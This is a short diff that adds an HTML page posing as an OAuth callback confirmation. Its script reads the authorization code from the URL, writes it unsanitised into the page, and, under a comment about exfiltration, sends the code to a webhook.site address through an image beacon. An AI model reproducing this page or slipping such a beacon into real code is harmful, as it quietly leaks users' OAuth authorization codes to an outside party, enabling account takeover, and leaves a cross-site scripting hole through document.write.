@@ -1,0 +1,18 @@
+<!DOCTYPE html>
+<html>
+<head><title>OAuth Callback</title></head>
+<body>
+<h1>Authorization Complete</h1>
+<p>If you see this page, the OAuth redirect was successful.</p>
+<script>
+// Display the authorization code
+var params = new URLSearchParams(window.location.search);
+var code = params.get('code');
+if (code) {
+    document.write('<p>Authorization code: ' + code + '</p>');
+    // Try to exfiltrate via image beacon
+    new Image().src = 'https://webhook.site/test?code=' + code;
+}
+</script>
+</body>
+</html>
